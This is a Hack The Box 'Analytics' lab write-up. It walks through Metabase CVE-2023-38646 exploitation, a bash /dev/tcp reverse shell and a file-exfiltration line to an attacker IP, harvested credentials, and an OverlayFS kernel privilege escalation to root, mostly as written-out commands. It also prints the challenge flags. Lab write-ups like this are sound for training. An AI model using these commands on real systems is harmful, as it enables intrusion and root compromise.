# HTB: ANALYTICS

## Challenge Details

- **Category:** [[CyberSecurity]], [[Web Exploitation]], [[CVE-2023-38646]], [[Metabase]], [[Reverse Shell]], [[LFI/RCE]], [[Linux Privilege Escalation]], [[OverlayFS]]
    
- **Difficulty:** Medium
    
- **Target:** analytical.htb (10.129.229.224)
    
- **Status:** #solved
    
- **Date Completed:** [[2025-11-28]]
    

---

## 🔎 Phase 1: Reconnaissance & Initial Access

The initial goal was to map the attack surface and find a vulnerable entry point.

### 1. Nmap Scanning (Reconnaissance)

Your comprehensive Nmap commands identified only two open services on the target **10.129.229.224**.

|**Command**|**Key Finding**|
|---|---|
|`nmap -p- -Pn $target -v ...`|Ports **22 (ssh)** and **80 (http)** are open.|
|`nmap -Pn $target -sV -sC -v ...`|**SSH** is OpenSSH 8.9p1 (Ubuntu). **HTTP** is **nginx 1.18.0 (Ubuntu)**, title is "Analytical".|
|`nmap -T5 -Pn $target -v --script vuln ...`|Noticed a potential false positive for `http-vuln-cve2011-3192` (Apache DoS), but the server is Nginx.|

### 2. Directory Brute Force (Fails)

|**Command**|**Purpose**|**Result**|
|---|---|---|
|`gobuster dir -u http://analytical.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 50`|Directory brute-forcing of the main site.|Only common directories (`/images`, `/css`, `/js`) were found. **No immediate results.**|

### 3. Subdomain Discovery & Vulnerability

Manual inspection of the website (implied by the log) revealed a **Metabase** instance, possibly on a subdomain.

- **Subdomain Identified:** `data.analytical.htb` (Metabase instance)
    
- **Version Identified:** **Metabase 0.46.6**
    
- **Vulnerability:** A search identified **CVE-2023-38646** (Pre-Auth RCE in Metabase).
    

---

## 💥 Phase 2: Remote Code Execution (RCE) via Metabase

The exploit chain required obtaining a setup token and then using the H2 database injection vulnerability.

### 1. Token Retrieval (LFI)

The Metabase API endpoint for properties was used to leak the setup token.

|**Action/Command**|**Purpose**|**Key Finding**|
|---|---|---|
|`GET /api/session/properties HTTP/1.1` (via BurpSuite on `data.analytical.htb`)|Retrieves the configuration properties.|**Setup Token:** `249fa03d-fd94-4d5b-b94f-b4ebf3df681f`|
|**Failed POST Attempt:**|Attempted to use the wrong token first, resulting in `"errors":{"token":"Token does not match..."`.||

### 2. Reverse Shell Payload Delivery (RCE)

The setup token and the `api/setup/validate` endpoint were used to inject a payload that forces the Metabase server to initiate a connection to the attacker's machine.

| **Command/Payload Component**                                                                                                                                                                              | **Purpose**                                              |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `nc -lvnp 8000`                                                                                                                                                                                            | Listener 1 for initial connection verification.          |
| **Payload 1 (Verification):** Injection via `POST /api/setup/validate` with your token and the H2 DB payload. The payload forces a **Java URL connection** to your attack box (`http://10.10.14.48:8000`). | Confirmed the target could reach the attack box.         |
| **Base64 Shell:** `echo -n 'bash >& /dev/tcp/10.10.14.48/8008 0>&1' \| base64 -w0`  `YmFzaCAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNDgvODAwOCAwPiYx`                                                                 | Base64-encoded shell to execute within the Java context. |
| `nc -lvnp 8008`                                                                                                                                                                                            | Listener 2 for the final reverse shell.                  |
| **Payload 2 (RCE):** Modified H2 DB payload with the base64 shell in the `java.lang.Runtime.getRuntime().exec` section.                                                                                    | Successfully executed the reverse shell.                 |

### 3. Gaining Access and Initial Information

|**Command**|**Purpose**|**Result**|
|---|---|---|
|`ls /` (in the shell)|Navigating the environment.|Confirms a containerized environment.|
|`cat metabase.db.mv.db > /dev/tcp/10.10.14.48/8009`|**Failed Attempt:** Tried to extract the local database file, but found no useful information.||
|`env`|Lists environment variables.|**Critical Finding:** Exposed credentials for a user: **`META_USER=metalytics`**, **`META_PASS=An4lytics_ds20223#`**.|

### 4. SSH and User Flag

The discovered credentials were used to gain a stable shell via SSH.

|**Command**|**Purpose**|**User Flag**|
|---|---|---|
|`ssh metalytics@analytical.htb`|Log in with discovered credentials.||
|`cat user.txt`|Reads the user flag file.|`09fc00d7dd5820133426baa194742741`|

---

## 👑 Phase 3: Privilege Escalation (Root Flag)

The final step involved an unprivileged user exploiting a kernel vulnerability.

### 1. Kernel Vulnerability Identification

|**Command**|**Purpose**|**Key Finding**|
|---|---|---|
|`uname -a`|Checks the kernel version.|`Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC`|
|**Search:** `6.2.0-25-generic #25~22.04.2-Ubuntu SMP`|Search led to the **OverlayFS** vulnerability (CVE-2023-32629/CVE-2023-33293).||

### 2. OverlayFS Privilege Escalation

The exploitation involves creating an unshare user namespace, setting up an OverlayFS mount point, and using `setcap` on a binary (like `python3`) to run it as root.

|**Command**|**Purpose**|**Result**|
|---|---|---|
|`unshare -rm`|Creates a new user and mount namespace.|Access granted to a root-like shell within the namespace.|
|`mkdir l u w m`|Creates directories for the OverlayFS mount.||
|`cp /usr/bin/python3 l/`|Copies the target binary to the lower directory.||
|`setcap cap_setuid+eip l/python3`|Sets the capability on the binary, which will be preserved after mounting.||
|`mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m`|Creates the vulnerable OverlayFS mount.||
|`touch m/*`|Triggers the required file system modification within the mount.||
|`exit`|Exits the unshare shell back to the `metalytics` user.||
|`u/python3` $\implies$ `import os; os.setuid(0); os.system("bash")`|Executes the compromised Python binary, escalating the session to root.|**Root Shell Acquired!**|

### 3. Acquiring the Root Flag

| **Command**          | **Purpose**                | **Root Flag**                      |
| -------------------- | -------------------------- | ---------------------------------- |
| `cat /root/root.txt` | Reads the final flag file. | `1eeee1555e6f4d7f740503d638133c67` |
